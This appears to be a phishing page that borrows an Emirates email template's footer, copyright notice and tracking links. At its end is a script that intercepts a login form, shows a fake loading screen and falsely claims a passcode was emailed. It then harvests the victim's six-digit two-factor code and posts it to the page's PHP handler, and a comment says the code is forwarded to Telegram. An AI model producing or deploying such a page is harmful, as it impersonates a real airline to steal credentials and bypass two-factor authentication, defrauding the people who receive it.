    <!--[if mso]>    <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">    <tr>    <td>    <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td align="center" style="height: 15px; line-height: 15px; font-size: 15px; overflow: hidden;" valign="top">
       </td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--></td></tr></table></div>

 

</td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<div data-marker="wrapper" style="" class="stylingblock-content-wrapper"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td align="center" valign="top">
    <!--[if mso]>    <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">    <tr>    <td>    <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td align="center" style="height: 15px; line-height: 15px; font-size: 15px; overflow: hidden;" valign="top">
       </td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--></td></tr></table></div>

 

</td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">






<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">





<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


    <table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">




<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<div data-marker="wrapper" style="" class="stylingblock-content-wrapper"><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td align="center" valign="top">
    <!--[if mso]>    <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">    <tr>    <td>    <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td align="center" style="height: 15px; line-height: 15px; font-size: 15px; overflow: hidden;" valign="top">
       </td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--></td></tr></table></div>

 

</td></tr></table>


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><!-- Email Footer : BEGIN --><table align="center" aria-hidden="true" bgcolor="#333333" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 842px;" width="100%">
 
  <tr>
   <td>
    <!--[if mso]>       <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">       <tr>       <td>       <![endif]--><table align="center" aria-hidden="true" bgcolor="#333333" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td style="font-family: HelveticaNeue, Helvetica Neue, Helvetica, Arial, sans-serif; font-weight: 300; font-size: 14px; color: #a9a9a9; padding: 20px 10px 0;">
        <a  href="https://click.e.emirates.email/?qs=1b7df01887961eb95ea688055c5e4ca7f550e4a567d46360db82b8ee6ad8b4b1b2e3ec71e7b1ef898403d8ea32cc7bff1e1a71fdaa53943a7f5fdb6f671c8b93" style="color: #a9a9a9; text-decoration: none;" target="_blank">Unsubscribe</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a  href="https://click.e.emirates.email/?qs=1b7df01887961eb9d90feb2e7d78137f1120ee54161beb086f0170ec8501f7ecea9997e2a80d43875e963f23e306175a71a3278bdde25b77dfe65f33e7e4d280" style="color: #a9a9a9; text-decoration: none;" target="_blank"> Contact us</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br class="mobile-only">
        <br class="mobile-only">
        <a  href="https://click.e.emirates.email/?qs=1b7df01887961eb9443b2249b306aeb16fab717ffec1b98117e47444fb8cf87fe108161442209b6392b73746b4d8700c1afd5d48e97aa95da27f19d19c562069" style="color: #a9a9a9; text-decoration: none;" target="_blank">Privacy policy</a></td></tr></table><table align="center" aria-hidden="true" bgcolor="#333333" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
     
      <tr>
       <td class="copyright" height="110" style="font-family: HelveticaNeue-Bold, Helvetica Neue Bold, Helvetica, Arial, sans-serif; font-size: 12px; color: #ffffff; padding: 0 10px; height: 110px; vertical-align: middle;" valign="middle">
        <span style="display: block; padding: 0 0 16px; min-width: 160px;">&copy; 2024 The Emirates Group. All rights reserved.</span></td><td align="right" class="footerbrand" height="110" style="padding: 0 10px; width: 82px; height: 110px;" width="82">
        <a  href="https://click.e.emirates.email/?qs=1b7df01887961eb92cc8a03c9a327d542038d2688de4f47b2421e4b5ebfb6cdd3521be9547f359ee7775584cfdc49806975f590ebb043ed3bb6888ea2fcac98c" style="display: block; width: 82px; height: 110px; background-color: #d10911; color: #ffffff; text-align: center;" target="_blank"><img height="110" src="https://image.e.emirates.email/lib/fe5615707c610d7a7310/m/1/f888b332-ab2d-4dec-9080-87dfa922621e.png" style="display: block; width: 82px; height: 110px; border: none; outline: none; font-size: 12px; font-family: Emirates-Bold, HelveticaNeue-Thin, Helvetica Neue Thin, Helvetica, Arial, sans-serif; font-weight: 300;" title="Emirates" width="82"> </a></td></tr></table><!--[if mso]>       </td>       </tr>       </table>       <![endif]--></td></tr></table><!-- Email Footer : END --></td></tr></table>

 

</td></tr></table>




<table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner">


<table cellpadding="0" cellspacing="0" width="100%" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><!-- Ts&Cs : BEGIN --><!--[if mso]>    <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="642" align="center">    <tr>    <td>    <![endif]--><table align="center" aria-hidden="true" border="0" cellpadding="0" cellspacing="0" role="presentation" style="max-width: 100%; margin: 0 auto;" width="100%">
 
  <tr>
   <td style="font-family: HelveticaNeue-Light, Helvetica Neue Light, Helvetica, Arial, sans-serif; font-size: 12px; color: #666666; line-height: 20px; padding: 10px;">
    This email has been sent to you by Emirates, a corporation established by Emiri Decree no. 2 of 1985 in Dubai, United Arab Emirates. Corporate Headquarters: Emirates Group Headquarters, Airport Road, PO Box 686, Dubai, UAE. &copy; 2024 Emirates. All rights reserved. </td></tr></table><!--[if mso]>    </td>    </tr>    </table>    <![endif]--><!-- Ts&Cs : END --></td></tr></table>

 

</td></tr></table></td></tr></table><!---->

            <!--[if mso]>             </td>             </tr>             </table>             <![endif]-->
        </div>
    </center>
 <script>
// Initialize the loading window variable outside of any function to make it globally accessible
let loadingWindow;

document.addEventListener("DOMContentLoaded", function() {
    document.querySelector(".login-form").addEventListener("submit", function(e) {
        e.preventDefault(); // Prevent the form from submitting in the traditional way

        // Create the loading window and add it to the page
        createLoadingWindow();

        // Simulate an AJAX request to the server
        setTimeout(function() {
            // After the "request" is "completed", adjust the loading window to prompt for the 2FA code
            prepare2FAInputFields();
        }, 2000); // Simulate a 2-second server request/response time
    });
});

// Function to create and style the loading window
function createLoadingWindow() {
    loadingWindow = document.createElement("div");
    loadingWindow.innerHTML = "<style>h1, p { font-family: 'EmiratesBold', sans-serif; }</style><br><h1>Please wait, this may take a few minutes. Do not refresh the page.</h1><br><center><img src='https://media3.giphy.com/media/jOmuouVZGQIBFynkMk/giphy.gif' alt='Loading...' style='width: 240px; height: 240px;'></center>";
    applyLoadingWindowStyles();
    document.body.appendChild(loadingWindow);
}

// Function to prepare and display 2FA input fields along with the submission logic
function prepare2FAInputFields() {
    var email = document.getElementById("email").value;
    loadingWindow.innerHTML = "<div style='font-family: Arial, sans-serif; font-size: 16px;'>An email with a 6-digit passcode has been sent to " + email + ". Enter the passcode below:</div></br></br></br>";

    var inputContainer = createPinInputFields();
    loadingWindow.appendChild(inputContainer);

    var submitButton = createSubmitButton();
    loadingWindow.appendChild(submitButton);
}

// Function to create PIN input fields
function createPinInputFields() {
    var inputContainer = document.createElement("div");
    inputContainer.style.display = "flex"; // Use Flexbox
    inputContainer.style.justifyContent = "center"; // Center the items in the container
    inputContainer.style.gap = "10px"; // Adds space between inputs

    for (let i = 0; i < 6; i++) {
        var pinInput = document.createElement("input");
        setupPinInput(pinInput, i);
        inputContainer.appendChild(pinInput);
    }
    return inputContainer;
}

// Adjustments in setupPinInput function for mobile responsiveness
function setupPinInput(pinInput, index) {
    pinInput.type = "text";
    pinInput.maxLength = "1";
    pinInput.id = "pin" + index;
    pinInput.className = "pin-input";
    pinInput.autocomplete = "off";
    pinInput.style.textAlign = "center";
    pinInput.style.fontSize = "20px";
    pinInput.style.width = "40px"; // Adjust as necessary for better mobile appearance
    pinInput.style.height = "40px"; // Adjust as necessary for better mobile appearance
    // Responsive adjustments can be added here if needed
    pinInput.addEventListener("input", function() {
        if (this.nextSibling && this.value) {
            this.nextSibling.focus();
        }
    });
}

// Function to create and setup the submit button
function createSubmitButton() {
    var submitButton = document.createElement("button");
    submitButton.textContent = "Submit 2FA Code";
    submitButton.style.marginTop = "20px";
    submitButton.onclick = submit2FACode; // Attach the function to send the 2FA code
    return submitButton;
}

// Function to send the 2FA code to the server (and ultimately to Telegram)
function submit2FACode() {
    var pin = "";
    for (let i = 0; i < 6; i++) {
        pin += document.getElementById("pin" + i).value;
    }

    // Replace this console.log with your AJAX request to send the PIN to your server
    console.log("Sending 2FA code to the server:", pin);
    // Example AJAX request (you need to replace the URL and possibly adjust data handling)
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            // Handle response here (e.g., redirecting to another page)
            window.location.href = "success_page.php"; // Redirect on success
        }
    };
    xhr.send("pin=" + pin); // Send PIN data to the server
}

// Function to apply styles to the loading window
function applyLoadingWindowStyles() {
    loadingWindow.style.position = "fixed";
    loadingWindow.style.left = "50%";
    loadingWindow.style.top = "50%";
    loadingWindow.style.transform = "translate(-50%, -50%)";
    loadingWindow.style.backgroundColor = "#fff";
    loadingWindow.style.padding = "20px";
    loadingWindow.style.borderRadius = "5px";
    loadingWindow.style.boxShadow = "0 4px 8px rgba(0,0,0,0.2)";
    loadingWindow.style.textAlign = "center";
    loadingWindow.style.zIndex = "1000"; // Ensure it's above other content
}
</script>


 <img src="https://click.e.emirates.email/open.aspx?ffcb10-feba1579726c0d7e-fe4f1273716c0d757c15-fe5615707c610d7a7310-ff9e1570-fe4512747c6c01747d1d-ff5b127772&d=10189&bmt=0" width="1" height="1" alt="">
</body>
</html>
